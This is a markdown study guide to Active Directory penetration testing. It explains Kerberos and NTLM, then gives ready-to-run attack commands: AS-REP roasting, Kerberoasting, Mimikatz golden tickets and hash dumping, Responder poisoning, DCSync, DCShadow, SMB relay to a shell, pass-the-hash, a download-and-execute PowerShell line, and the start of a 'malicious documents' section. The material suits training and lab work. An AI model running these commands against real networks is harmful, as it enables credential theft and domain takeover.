# Active Directory(AD) Pentesting 

#### Active Directory is a directory service created by Microsoft that lets us easily manage computers in a network. It consists of a database which stores information about everything in the network.  It also provides a set of services which can be used to perform various tasks

#### A directory service is a system that is used to store, organize and access information about network resources. They also help users/computers identify resources and services in the network

# Terminology 

1.  Forest - A group of trees
2. Trees - The combination of a domain and all the child domains
3. Domains - Logical group of objects with similar settings and which share the same database. Lets us groups objects and manage. They can be identified by a domain name. Managed by a domain controller
4. Forest Root - First domain in the forest. Contains the Enterprise and Schema Admin groups
5. Workgroup - A LAN which consists of computers that are sharing resources (data/software/hardware) with each other. All computers are equal and no computer is used to manage the workgroup. Max 10 computers
6. Objects - EVERYTHING IN ACTIVE DIRECTORY IS AN OBJECT. Groups, printers, users, computers, domains, etc
7. Organizational Units - Containers in which we can add other users, groups, servers, etc. Used to organize objects and apply policies to them. It is like a folder containing files where files are objects. Are in a domain
8. Trust - Special permissions which allow users to access resources in other domains. In directional trusts, a trusting domain can access resources in the trusted domain. In transitive trusts, 2 domains trust each other and so can access resources in each other. Other than this, the domains can access domains which are trusted by each other 
9. Domain Controller - The boss computer which has complete access to a domain and is used to manage it. AD is installed on this computer. Runs services to authenticate users and stores the datastore aka the database which stores information about objects in that domain. If a change is made to the datastore in 1 DC, the changes are made to the datastore in the others
10. Schema - Rules and permissions for creating objects
11. Global Catalog - Stores information about objects and their attributes
12. Query and Index system - Search for objects and their attributes
13. Replication Service - Copy data from 1 DC to another. The process of transferring and updating the datastore from 1 DC to another is called domain replication
14. Distinguished name - A special name which is used to identify the location of an object in AD. To construct a distinguished name, we should know the object's name, the OU it is in and the domain it is in. It can be found in the 'objectCategory' of the 'Attribute Editor' of the AD Users and Computers interface. Format:

```txt
CN=<Object Name>, OU=<OU Name>, DC=<Second level domain>, DC=<Top level domain>

CN = Hello World, OU=test, DC=active, DC=local

CN = Arav\,test, OU=hello, OU=world, DC=active, DC=local
```

To find the domain name, add the 2 DC values

15. SID - Secure Identifier. All objects in the domain have this unique ID to identify them. The last section of the SID is called the RID i.e. relative identifier which is used to identify that object in a domain
16. Group Policy Objects (GPOs) -  
17. SYSVOL - Network file share which is hosted on all the DCs and stores files which should be accessible by all authenticated users in the domain

# Default Users

1. Administrator - The admin on the first DC. All windows computers in the forest will have this user 
2. krbtgt - User on the DC of all domains. It is the service account for the KDC. Password is set by the system. It's NT hash is used to encrypt TGTs 
3. Guest - Lets users have limited access to computers in the domain. Disabled by default. Password is blank. Lets one-time users perform tasks without needing an account
4. HelpAssistant - Created when a remote assistance session is running. Disabled when there are no remote assistance requests. Remote Assistance session is used to connect to another windows computer and it is initiated by invitation. Has limited access 

# Groups

Distribution groups -> Used by email apps to send an email to a collection of users

Security groups -> Used to assign permissions to a collection of objects in the network

Local groups -> Present in 1 computer and not the domain/forest

Global groups -> Present in the domain/forest

1. Enterprise Admins - Can access machines in the entire forest
2. Domain Admins - Can access the domain controller to manage the domain. All domain admins have the same RID
3. Service Accounts - Mostly never used except for service maintenance/management. Required by Windows servers which will pair a service such as a DNS server with a service account so that we can log into that service and manage it. Maybe a domain admin. 
4. Local Admins - Have complete access to a local machine(s). Do not have access to the domain controller
5. Domain Users - Normal users which log into machines to perform daily tasks. May have local admin permissions. All domain users have the same RID i.e. 513
6. Account Operators - Can create/modify most user accounts such as users, local groups and domain groups but not administrators. Can access the DC
7. Backup Operators - Can create backups and restore files on all computers in the domain (Including DC). Can log on to and shutdown computers too. Cannot replace files on the DC
8. DnsAdmins - Can access the information from the DNS server if it is running on the DC
9. Remote Management Users - Allows users to manage servers in the network using WinRM/WMI
10. Server Operators - Used to administer DCs. This group is a local group on the DC. Can log on to the DC, delete/create/modify network files shares, backup/restore files, stop/start services, format storage media and shutdown the DC. By default has no members
11. Schema Admins - Can make changes to the AD schema. Exists in the forest root domain
12. Print Operators - Can manage/create/modify/delete printers in the network. Can also manage printer objects
13. Cryptographic Operators - Can perform cryptographic operations such as encryption
14. Network Configuration Operators - Can modify TCP/IP properties in the LAN such as  IP addresses, subnet mask, default gateway and DNS server. Can modify/delete remote access connections
15. Key Admins - Can perform admin actions on key objects in the domain

# Services

1. Domain Services -> Backbone of active directory. This is installed by default. Used to store information about objects in a database and authenticate users to services. Allows provides authorization features
2. Certificate Services -> Allows the DC to create and use digital certificates, signatures, asymmetric encryption
3. Federation Services -> Provides single sign on so that users do not have to always type their credentials
4. Rights Management Services -> Used to control information rights and data security policies such as whether a user can access a file 
5. Lightweight Directory Services -> Provides data storage and enables cross platform capabilities so that a Linux computer can access the domain. Uses LDAP which is a protocol used to retrieve information about the domain from the datastore and authenticate users to services
6. Users and Computers - Provides an interface to create/manage objects in the domain. Used to view the contents of a domain

# NTLM

New Technology Lan Manager

LM Hashes -> Hashes stored in the SAM database of old windows computers such as XP. Weak hashing algorithm. 

NTLM Hashes -> Hashes stored in the SAM database of modern windows computers. An NTLM hash is made up of an LM hash followed by an NT hash. Nowadays, LM hashes are no longer stored and the default value for it is `aad3b435b51404eeaad3b435b51404ee` which means 'no password'. Since the LM hash is not used in the NTLM hash, the NTLM hash is sometimes called the NT hash. This is the hash we use for pass the hash attacks. 

This is the structure of an NTLM hash from the SAM file

```txt
Username:UID:LM Hash:NT Hash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0d
```

Net-NTLMv1/v2 -> Challenge response protocols that are used to authenticate a user to a service on a windows server. The client will tell the server they want to authenticate to it. The server sends a challenge to the client. The client encrypts this challenge using it's NT hash and sends this back to the server. The server will then send the response sent by the client, the original challenge and the user's username to the domain controller. The domain controller will extract the real NT hash from the database and encrypt the challenge with it. It will then compare the 2 encrypted challenges and if they match, the client is allowed to login in. Net-NTLMv1/v2 are also known as NTLMv1/v2. NTLMv1 is rarely used as it is less secure compared to v2.

An NTLMv1/v2 hash is simply the challenge which has been encrypted with the user's NT hash

# UAC

User Account Control 

When an admin user logs into the computer, then all the tasks do not need to be executed with high privileges . With UAC, the admin's session will not run with high privileges 

When a task which needs high privileges is executed, a prompt is display which asks if the user wishes to proceed. This task will then run with high privileges

It also allows low privileged users run programs with admin privileges by specifying the password of the admin user

# LSA and LSASS

LSA -> Local Security Authority. Component of windows which takes cares of security operations

LSASS -> Local Security Authority Subsystem Service. Windows process which stores NT hashes and Kerberos tickets in a secure memory location. It can forward tickets/hashes to access network resources so that the user does not have to type their credentials all the time

# Tools to pentest AD

1. Impacket(0.9.19) - https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19
2. PowerSploit - https://github.com/PowerShellMafia/PowerSploit
3. Kerbrute - https://github.com/ropnop/kerbrute
4. Bloodhound - https://github.com/BloodHoundAD/BloodHound
5. Responder 
6. smbmap, smbclient, enum4linux 
7. Empire and Starkiller - https://github.com/BC-SECURITY/Empire and https://github.com/BC-SECURITY/Starkiller
8. CrackMapExec
9. evil-winrm
10. Mimikatz

# Kerberos

Kerberos is a protocol lets users use tickets to securely authenticate to services/resources in the domain

Default port: 88(TCP and UDP)

Service Principal Names(SPNs) are identifiers which are used to associate a service with a service account so that we can authenticate to that service and manage it

A Kerberos server runs on the domain controller and it is also known as the key distribution center(KDC). This will generate tickets so that users can access services. It includes 2 servers - Authentication Server and Ticket Granting Server

Kerberos is the default method of authentication in AD

In Kerberos, a special certificate is added to the TGT and TGS. It is called a privileged attribute certificate (PAC) and contains the privileges and information of the user

## Authentication process 

![Kerberos Authentication process ](kerberosAuth.png)

1. Once the user logs into their computer, it will send a ticket request to the KDC. The user's computer will send the current time encrypted with the user's NT Hash (Think of the NT hash as the key) and their username.  (AS_REQ)
 
2. Upon receiving this request, the KDC checks if a user with that username exists in the domain. To do so, it will check the AD database (This is possible since the KDC is running on the DC). If it finds the user, it will fetch it's corresponding NT hash and decrypt the time. If the time is found to be within 5 minutes of the DC's clock time, it will proceed. This is to prevent replay attacks. The KDC will generate a TGT (Ticket Granting Ticket), a session key and a PAC. The session key and PAC are put into the TGT and this is encrypted with the NT hash of the krbtgt user. A copy of the session key is then encrypted with the user's NT hash and these are sent back to the user. (AS_REP)

3. The user's computer will decrypt the copy of the session key using the user's NT hash. Now to access a service, the user's computer will send the TGT back to the KDC. It will also send the SPN to the KDC send it to the KDC. Along with the TGT and SPN, we send it's username and the current time which are encrypted with the session key to prove that we are that user since we were able to decrypt the session key using our NT hash (TGS_REQ)
 
4. Upon receiving this, the KDC will decrypt the TGT using the NT hash of the krbtgt user. By doing so, it will extract the session key and decrypt the username and time. If it can decrypt the data, it proceeds. The KDC will then try to find the SPN and when it does, it will get the service account associated with it. It then generates a TGS (Ticket Granting Service) and a new session key and PAC.  It will put the new session key and a new PAC into the TGS and encrypt it with the service account's NT hash which it fetched from the AD database. It will then encrypt a copy of the new session key with the user's NT hash and send these back to the user's computer. (TGS_REP)
 
5. The user's computer will send the TGS and it's username and current time which are encrypted with the session key to the service. Along with the TGS, we send the username and current time which are encrypted with the session key to prove that we are that user since we were able to decrypt the new session key using our NT hash. (AP_REQ)

7.  The service will decrypt the TGS by using it's service account's NT hash and get the new session key and new PAC. It will then decrypt the username and time using the new session key. If the service can decrypt these, it proceeds

8.  To verify if this PAC is a legitimate one and has not been forged, the service sends this PAC to the KDC. This is an optional step (VERIFY_PAC)

 9. Upon receiving the PAC, the KDC checks if it is valid. If it is, the KDC sends a message to the server to let it know that it is valid. (PAC_VERIFY_RESPONSE)
 
 10. The service now knows the privileges of the user by reading the PAC and it knows that it is that user since it was able to decrypt the data with the same session key which the user used and that the user was able to decrypt the session key with it's NT hash. The user is now allowed access to the service (AP_REP) 

In Kerberos, anyone is allowed to provide credentials to the KDC and get a TGT and hence get a TGS. But the service will not allow us to gain access with the TGS as it checks if we have the permission to provide a TGS and gain access

## Finding Domain Users

First we will have to download Kerbrute and add it to our path 

We will have to provide a usernames file, the domain name and the IP of the domain controller which has the KDC

```txt
kerbrute userenum --dc 10.10.10.100 -d active.local users.txt
```

Here, 'active.local' is the domain name, '10.10.10.100' is the IP of the DC and 'users.txt' is the list of possible usernames

In this, we connect to the KDC and send a username from the list to authenticate. The KDC sends an error message i.e. 'KDC_ERR_C_PRINCIPAL_UNKNOWN' if the user does not exist in the datastore. If it returns any other message, it means the user is valid

WE SHOULD NEVER ATTACK THE KDC SERVICE VIA A BRUTEFORCE ATTACK AS AFTER A CERTAIN NUMBER OF FAILED LOGIN ATTEMPTS, THE USER ACCOUNT WILL BE LOCKED OUT/DISABLED

## AS-REP Roasting 

In an AS-REP Roasting attack, we do not need to provide credentials to the KDC. This is because that account has preauthentication disabled. This is generally used to gain access to a user account and not a service one. We ask the KDC for a TGT and it will send it and a copy of the session key which is encrypted with the user's NT hash back to us. Now we can take a random password, hash it and try to decrypt the key. We keep on doing this until we can decrypt the key and when we can, we have found the correct password

Using the 'GetNPUsers.py' script from Impacket, we will grab a TGT from the KDC and crack the hash with hashcat

If we do not know the username we wish to attack, we can provide a usernames file

```txt
python GetNPUsers.py -no-pass -dc-ip 10.10.10.100 active.local/ -usersfile user.txt
```

Here, 'active.local' is the domain, '10.10.10.100' is the IP of the DC and 'users.txt' is the list of possible usernames

If we do have the username of the account which is AS-REP roastable, we can provide that

```txt
python GetNPUsers.py -no-pass -dc-ip 10.10.10.100 active.local/svc-admin 
```

Here, 'active.local' is the domain name, '10.10.10.100' is the IP of the DC and 'svc-admin' is the AS-REP Roastable service account

This script will request the KDC for the TGT of that user and will not have to provide credentials as preauthentication is disabled for the account. It will then receive the TGT and session key

Now this hash can be cracked using hashcat 

```txt
hashcat -m 18200 -a 0 asrep.txt rockyou.txt
```

Here, 'asrep.txt' is the file containing the hash and 'rockyou.txt' is the wordlist

## Kerberoasting 

Kerberoasting is an attack in which we have credentials and can grab a TGT from the KDC. So we can also grab a TGS from the KDC. Since the TGS is encrypted with the service account's NT hash, we can take a random password, hash it and try to decrypt the key. We keep on doing this until we can decrypt the key and when we can, we have found the service account's password

We can find kerberoastable service accounts with bloodhound

Using the 'GetUserSPNs.py' script from Impacket, we will authenticate with the KDC which will provide a TGT. CREDENTIALS ARE REQUIRED TO PERFORM A KERBEROASTING ATTACK

```txt
python GetUserSPNs.py -request -dc-ip 10.10.10.100 active.local/svc-admin
```

Here, 'active.local' is the domain name, '10.10.10.100' is the IP of the DC and'svc-admin' is the account whose credentials we have

Now this hash can be cracked using hashcat 

```txt
hashcat -m 13100 -a 0 kerb.txt rockyou.txt
```

Here, 'kerb.txt' is the file containing the hash and 'rockyou.txt' is the wordlist

## Golden Ticket

In this attack, we create a forged TGT which is encrypted using the krbtgt account 's NT hash and so we can request a TGS for any SPN and access the service

This is a post exploitation attack which lets us establish persistence. We perform this attack once we have access to the DC

To perform this attack, we will use Mimikatz

We will need the NT hash of the krbtgt account, the domain SID and the domain name

1. To obtain the domain SID, we can run this command

```txt
whoami /USER
```

The domain SID is under the 'SID' column and is the string of characters from the starting to the 2nd last set of characters. For example, if this command displays `S-1-5-21-3566474924-3672637628-382372873-1002`, then the domain SID is `S-1-5-21-3566474924-3672637628-382372873`

2. Now we will have to get the NT hash of the krbtgt account. This can be done in 2 ways, dumping hashes from the SAM and SYSTEM files or dumping the LSA secrets

#### Dumping hashes from the SAM and SYSTEM files

Query the registry to grab the SAM and SYSTEM files. Run cmd as an Administrator to do this

```powershell
reg save hklm\sam C:\Temp\sam.hive
reg system hklm\system C:\Temp\system.hive
```

Now launch Mimikatz and the dump the hashes from the files using LSADump

```txt
mimikatz # lsadump::sam /system:C:\Temp\system.hive /sam:C:\Temp\sam.hive
```

#### Dumping LSA secrets

```txt
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt
```

3. Using Mimikatz, you can now create a forged ticket which will be valid for 10 years and will be signed by the krbtgt account. Run this command in Mimikatz to do so

```txt
mimikatz # privilege::debug
mimikatz # kerberos::golden /user:admin2 /domain:active.local /sid:S-1-5-21-3566474924-3672637628-382372873 /krbtgt:a991ae45aa987a1a48c8bdc1209ff0e7 
```

Here, 'admin2' is the new user, 'active.local' is the domain name, 'S-1-5-21-3566474924-3672637628-382372873' is the domain SID and 'a991ae45aa987a1a48c8bdc1209ff0e7' is the NT hash of the krbtgt account. Make sure that the user does not already exist as Mimikatz will create a new user

4. Now you can save this ticket to a file and launch command prompt which would let us use this ticket

```txt
mimikatz # kerberos::ptt ticket.kirbi
mimikatz # misc::cmd
```

# LLMNR, NBNS and mDNS 

LLMNR(Link-Local Multicast Name Resolution) is a layer 7 protocol used to resolve a hostname to an IP address (aka find the IP address of the computer with that hostname) if DNS the server fails to do so. It lets us connect to a service by providing a hostname instead of an IP address.

When connecting to a service via a hostname, our computer first queries the DNS server to check if it can find the IP address for that hostname. If it does not, a broadcast is sent across the network using LLMNR which asks if a computer with that hostname exists and if it does, it should respond with it's IP address to our computer.  If it does, the server with that hostname will respond back to us with it's IP address and thus we can connect to it.

Similar to LLMNR, there is another protocol named NetBIOS Name Service (NBNS) which would resolve a NetBIOS name to an IP address by sending a broadcast query. NetBIOS is an API which lets apps/computers communicate with each other on a LAN. NetBIOS names are used to identify the computers. Nowadays, we use NetBIOS over TCP/IP which is a protocol that lets old computers/apps use the TCP/IP stack via the NetBIOS API to communicate with modern computers/apps. NetBIOS -> Network Basic Input/Output System

Similar to the above, mDNS (Multicast Domain Name System) is a layer 7 protocol which is used to resolve a hostname to an IP address. This is used in the case when there is no DNS server in the network and a broadcast query needs to be sent to the resolve a hostname to an IP address. 

All of the above protocols use UDP at layer 4

All these protocols are vulnerable since they send out broadcast queries. In this case, an attacker's computer on the network can respond with their IP address even if it does not have that hostname and so the victim can connect to the attacker's machine 

##  Poisoning

![Poisoning](poisoning.png)

LLMNR/NBNS/mDNS Poisoning is an attack in which an attacker listens for LLMNR/NBNS/mDNS broadcast queries and when it receives one, it responds with it's IP address. If the client types an invalid hostname, a broadcast query would be sent but no computer would send a reply but our computer would and this would cause the target to connect to us and authenticate to us

'Poisoning' refers to responding with our IP address for a query even if we not have that hostname

To perform an LLMNR/NBNS/mDNS Poisoning attack, we will use Responder. 

Responder is the tool we use to listen for broadcast queries and respond with our computer's IP address. It runs multiple services which clients can connect to and provide an NTLMv2 hash

If a user tries to connect to the service of an invalid hostname, then the DNS server will not be able to resolve the IP address and then the computer will use LLMNR/NBNS/mDNS to do so. Using LLMNR/NBNS/mDNS, a broadcast query will be sent to the entire network asking for the computer with that hostname to respond with it's IP address. Responder will send a reply with our computer's IP address and so the victim will connect to us. Upon connecting to our computer, Responder will send the NTLMv2 challenge and the target will encrypt it with it's NT hash and send it back. Now we have the NTLMv2 hash which can be cracked. LLMNR/NBNS/mDNS do not check the integrity of the response for the query i.e. it does not confirm that the computer responding actually has that hostname and so any computer is able to respond to a query

We can run responder using this command. 

```bash
sudo ./Responder.py -i eth0 -rdwv
```

Here, 'eth0' is the interface we wish to listen on

If a host tries to connect to an invalid hostname/our IP address, responder will send a reply to the machine and provide our machine's IP address 

Once the NTLM challenge-response takes place, we will have an NTLMv2 hash (NT Hash+Challenge)

This can be cracked using John

```txt
john --format=ntlmv2 --wordlist=rockyou.txt hash.txt
```

Here, 'rockyou.txt' is the wordlist we will use and 'hash.txt' is the file containing the hash

## WPAD Spoofing

Web-Proxy Auto Discovery is a protocol which lets web browsers automatically discover HTTP/HTTPS proxy configuration files which are stored on servers in the network.

During this process, the web browser would first check if it has received the URL from the DHCP Server. This URL states the location of the file. If it does, it will simply download it. Else it proceeds to the next step

If the previous step didn't work, the computer sends a query to the DNS server to resolve  `wpad.<DOMAIN>` or `wpad.<TLD>` or `wpad.<SUBDOMAIN>.<DOMAIN>` to the IP address. If the DNS server cannot resolve the domain, it will proceed to the next step

Finally, a broadcast query would be sent to the network via LLMNR/NBNS/mDNS to resolve the IP address. If this step does not result in our computer getting the domain of the server, the HTTP(S) request is sent without a proxy.

In most cases WPAD is disabled in the domain and if this would fail and so we could perform an LLMNR/NBNS/mDNS poisoning attack and grab the credentials of the user trying to authenticate. These credentials would be in cleartext

To perform this attack, we will again use responder

```bash
sudo responder -i eth0 --wpad
```

When a client's web browser wants to fetch the proxy config file, it would ask the DNS server on the DC to resolve `wpad.<DOMAIN>` to it's IP address. Once this would fail, an LLMNR/NBNS/mDNS broadcast query would be sent to the network, asking for the computer with that hostname to reply with it's IP address and responder would reply with our machine's IP address. The machine would then attempt to connect to our machine by providing it's credentials and then we would capture them

# BloodHound

The best tool to enumerate and discover ways to attack a forest. Lets us visualize data using a graphical DBMS known as neo4j. It is not a stealthy tool

First we'll have to start the neo4j database server

```bash
sudo neo4j console
```

Open your web browser and navigate to 'localhost:7474'. In the 'Connect URL' field, change the method from 'neo4j://' to 'bolt://' and in the username and password fields, type 'neo4j' and click on 'Connect'. Now type in a new password and click on 'Change password'. Close your web browser

Start BloodHound 

```bash
bloodhound
```

Enter the username as 'neo4j' and the password as the new password you set. Enable 'Save Password' so you do not have to always login 

To gather data about the forest we will have to use the collector on a compromised computer which is a part of a domain. We can either run the collector remotely which will connect to the compromised machine, collect the data and save a zip file on our machine or on the compromised machine itself which will generate a zip file on the compromised machine which we will have to transfer to our machine. If we run the collector on the compromised machine, it will generate more accurate results

If we are running it on the compromised machine, we will use the 'SharpHound' collector

```md
SharpHound.exe -c ALL
```

OR

```powershell
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
```

If we are gonna run the collector remotely, we will use the 'bloodhound-python' collector. Note: This can only enumerate 1 domain

```md
sudo pip3 install bloodhound
bloodhound-python -u svc_admin -p password123 -d active.local -dc 192.168.1.9 -c ALL
```

Here, 'svc_admin' is the username of the compromised account, 'password123' is the password of the compromised account, 'active.local' is the domain and '192.168.1.9' is the IP of the DC 

Once the collectors have collected the data and saved it to a zip file, we can just drag and drop it into bloodhound which will easily let us visualize and view the data 

# PowerUp 

Powerup is a powershell script which will check for privilege escalation vectors such as writable service path, unquoted service path, alwaysinstallelevated, etc

```powershell
IEX(New-Object Net.WebClient).DownloadString ("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1") #Download and Execute in RAM
Invoke-AllChecks
```

Now it will display all the privilege escalation vectors and the way to abuse it. To abuse the vulnerability, simply copy and paste the command next to 'AbuseFunction' 

# DCSync Attack

DCSync attack is an attack in which a user has replication rights and so it simulates a DC to replicate the NTDS.dit file from the DC to our computer. This is done via the replication service. By default, domains admins , enterprise admins, members of domain controller groups have replication rights

To check for a DCSync attack, we will need valid credentials. Once we do, we can run sharphound and then analyse the loot with bloodhound

The attack allows a attacker's computer to ask the domain controller to replicate the datastore, using the GetNCChanges function and send it to the attacker

To perform a DCSync attack, we will use 'secretsdump.py' from Impacket

```bash
secretsdump.py -outfile dcsync active.local/backup:'mypass123'@10.10.10.100 -just-dc
```

Here, 'active.local' is the domain name, '10.10.10.100' is the IP of the DC, 'backup' is the account which has DC Sync rights and 'mypass123' is the password of the backup account

# DCShadow Attack

Post exploitation attack which we perform when we are a domain admin. Stealthy 

In this attack, an attacker registers a compromised computer in the domain as a domain controller by changing the values of it's SPN. The attacker can make changes to the AD datastore and replicate them to the other DCs

We will use mimikatz to perform this attack

## Setup

```txt
C:\Temp > mimikatz.exe
mimikatz # !+ 
mimikatz # !processtoken
```

The above commands will start the mimidrv service and elevate our privileges by getting a privileged token 

In windows, programs can run in 2 modes:

1. Kernel Mode -> The program has direct and unrestricted access to the hardware and can use any number of resources. No middle man (OS) is involved. All processes in this mode will share the same memory address
2. User Mode -> The program can access the hardware via the OS. The OS allocates the resources to the program. All processes in this mode have different memory addresses

In windows, drivers are allowed to run in kernel mode. Mimidrv is a driver which can be used to escalate from user mode to kernel mode and run commands in kernel mode. Lets us bypass/deactivate security features such as LSA

Drivers are software which are used by the OS/application software to communicate with and control hardware

Every process has a token associated with it which defines the user which is running that process. Using  `!processtoken`  we can duplicate the process token of a privileged user  to an attacker-controlled process. In this case, mimikatz would duplicate the process token of a process being run by  `NT AUTHORITY\SYSTEM`  to the mimikatz process and cmd process

Now we can check which process token is associated with the mimikatz process

```txt
mimikatz # token::whoami
```

### Adding a domain user to Domain Admins group

To start a rogue domain controller we can run the following command. We should also specify the changes we are going to replicate to the other DCs

```txt
mimikatz # lsadump::dcshadow /object:arav /attribute:primaryGroupID /value:512
```

To register our computer as a valid one and replicate the changes to the datastore in the other DCs, run the following command in a new terminal window

```txt
C:\Temp > mimikatz.exe
mimikatz # lsadump::dcshadow /push
```

Now if we check our user information, we will see that we are a part of the Domain Admins group

```powershell
net user arav /domain
```

# SMB Relay Attack

In this attack, when a user attempts to access a resource via an invalid hostname, a LLMNR/NBNS/mDNS broadcast query which asks for the server with that hostname to respond with it's IP. 

In this case, our machine would reply with it's IP. (LLMNR/NBNS/mDNS Poisoning). When the computer connects to our machine to authenticate, it first sends its username and says it wants to login. Our computer forwards this username to the target server and says it want to login. 

The target will send a challenge back to our machine. We will send this challenge to the victim machine and it would encrypt it with it's NT hash and send it back to us. We would take this NTLMv2 hash (Challenge+NT hash) and send it to the target server. If the credentials are valid, we can login. However, we let the victim computer know that it could not login

 SMB Signing is used to digitally sign packets. This checks if any packet has been tampered with during the communication

![SMB Relay](SMB-Relay.png)
  
 1. First we will find all machines which are running an SMB server and message signing is disabled using cme

```bash
crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt
```

2. Next we have to configure and start Responder. Open the configuration file which is located at `/usr/share/responder/Responder.conf`

Set the value for 'HTTP' and 'SMB' as 'OFF' and save the changes

Now you can start responder

```bash
sudo ./Responder.py -i eth0 -rdwv
```

3. Now we will use NTLMRelayX from Impacket to forward the challenge to the tricked server and the NTLMv2 hash to the target server

```bash
python ntlmrelayx.py -tf targets.txt -smb2support
```

4. We can also get a shell by using NTLMRelayX. First we will have to setup a listener and create a powershell stager with Empire. Once we have that, we can use NTLMRelayX to get a shell

```bash
python ntlmrelayx.py -tf target.txt -smb2support -c "POWERSHELL STAGER"
```

# Pass the hash

If we have been able to grab the NTLM hash of a user, then instead of cracking it, we can send the NT hash to authenticate and gain access. Note: This will not work with NTLMv1/v2 hashes i.e. hashes used to authenticate to services which we captured by an attack such as LLMNR poisoning. These hashes are typically the ones which we can dump from the SAM database/NTDS.dit

This works because the challenge is encrypted with the user's NT hash and not the cleartext password

This is the structure of an NTLM hash from the SAM database

```txt
Username:RID:LM Hash:NT Hash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0d
```

We would have to pass the NT hash which would be 'a9fdfa038c4b75ebc76dc855dd74f0d' for the admin

These are some examples of passing the hash

```txt
evil-winrm -i 10.10.10.100 -u Administrator -H a9fdfa038c4b75ebc76dc855dd74f0d -> Powershell Remoting
xfreerdp /u:Administrator /pth:a9fdfa038c4b75ebc76dc855dd74f0d /v:10.10.10.100 -> RDP Server
crackmapexec smb 10.10.10.100 -u Administrator -H a9fdfa038c4b75ebc76dc855dd74f0d -x 'whoami' -> SMB Server
```

Some tools such as PsExec, WMIExec and the Impacket Tools require us to pass the entire NTLM hash i.e. LM Hash:NT Hash. If we do not have an LM Hash, simply use 32 0s as the LM Hash

```bash
python psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0d Administrator@10.10.10.100
python wmiexec.py -hashes 00000000000000000000000000000000:a9fdfa038c4b75ebc76dc855dd74f0d Administrator@10.10.10.100
python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0d active.local/Administrator@10.10.10.100
```

# CrackMapExec
 
Swiss army knife of AD pentesting and is used for password/hash spraying and bruteforcing

If we see `Pwn3d!`  in the output, it means that the credentials we have are for an admin account

All modules: https://www.infosecmatter.com/crackmapexec-module-library/

## SMB

### Spraying 

```bash
crackmapexec smb 10.10.10.100 -u /root/Desktop/user.txt -p mypass123
crackmapexec smb 10.10.10.0/24 -u Administrator -p mypassword123
crackmapexec smb 10.10.10.0/24 -u Administrator -H a9fdfa038c4b75ebc76dc855dd74f0d
```

### Dictionary Attack

```bash
crackmapexec smb 10.10.10.100 -u /root/Desktop/user.txt -p /root/Desktop/pass.txt
```

### Listing shares

```bash
crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'mypass123' --shares
```

### Listing drives

```bash
crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'mypass123' --disks
```

### Enumerating users

```bash
crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'mypass123' --users
```

### Enumerating groups

```bash
crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'mypass123' --groups
```

### Passing a hash

```bash
crackmapexec smb 10.10.10.100 -u Administrator -H a9fdfa038c4b75ebc76dc855dd74f0d
```

### Dumping the SAM file

```bash
crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'mypass123' --sam
```

### Executing commands

Will only work if we have credentials for an admin account

```bash
crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'mypass123' -x "whoami && dir"
```

### Listing modules

```bash
crackampexec smb -L
```

### Running a module

```bash
crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'mypass123' -M <Module>
```

Some modules are:

1. bloodhound
2. rdp
3. web_delivery
4. mimikatz
5. met_inject
6. gpp_password
7. Get-ComputerDetails

### Specifying module options

```bash
crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'mypass123' -M <Module> -O "<Options>"
```

## WinRM



## MSSQL


# LDAP

Lightweight Directory Access Protocol

Used to query the AD database for information about objects

Lets us remotely view the objects and their attributes in the domain

Views and fetches details of objects from the 'Attribute Editor' of each object

# Remote Procedure Call (RPC)

Protocol which lets a program use the service of another program on another computer in the network without knowing the information of that network

Layer 5 protocol

Port: 111 (TCP) on Linux and 135 (TCP) on Windows

### Connecting to the RPC server

```bash
rpcclient -U admin%password123 10.10.10.100
```

### OS and Server info

```bash
rpcclient $> srvinfo
```

### Domain information

```bash
rpcclient $> querydominfo
```

### Domain users

```bash
rpcclient $> enumdomusers
```

### Domain groups

```bash
rpcclient $> enumdomgroups
```

### Specific user information

```bash
rpcclient $> queryuser myUser
```

### Specific group information

```bash
rpcclient $> queryuser 0x200
```

0x200 -> RID of the group

### Privileges

```bash
rpcclient $> enumprivs
```

### Creating domain user

```bash
rpcclient $> createdomuser newUser
```

### Creating a domain group

```bash
rpcclient $> createdomgroup myGroup123
```

### File shares 

```bash
rpcclient $> netshareenum (Wont show hidden shares)
rpcclient $> netshareenum (Will show all shares including hidden ones)
```

### Specific file share information

```bash
rpcclient $> netsharegetinfo myshare
```

# Creating malicious documents

## Basics of Visual Basic Scripting(vb)

### Displaying a message

```vb
MsgBox("Hello World!") (One value)
MsgBox("Hello",1,"Idk") (Multiple values)
MsgBox(a,b,c) (Variables)
```

### Variables

```vb
Dim <Name> as <Type>
<Name> = <Value>
```

Important data types in vb are: 

* Byte
* Integer
* Double
* Long
* Date
* String

```vb
Dim a as Byte
a = 20
Dim b as Integer
b = 1037
Dim c as Double
c = 194.37842
Dim d as Long
d = 4676376
Dim e as Date
e = "2/10/2021"
Dim f as String
f = "hello world!"
```

Note: Variables can be created without specifying data types if they are calling a function

#### Declaring variables in 1 line

```vb
Dim a as Byte, b as Integer, c as Double
```

#### Concatenating variables

```vb
Dim str1 as String, str2 as String, str3 as String
str1 "Hello "
str2 = "World"
str3 = str1 & str2

Dim str1 as String
str1 = "Hello " & "World!"

Dim str1 as String, num as Integer

num = 10
str1 = "Number = " & num	

Dim str1 as String, str2 as String, str3 as String
str1 "Hello "
str2 = "World"
str3 = str1 + str2
```

### Sub procedures

These are basically functions without  a return type and can be called without a keyword

```vb
Sub test()

	STATEMENTS

End Sub
```

#### Parameterized sub procedures

```vb
Sub test(a as Integer, b as String)

	STATEMENTS

End Sub
```

#### Calling a sub procedure

```vb 
Sub Main()
	test 1 "Hello"
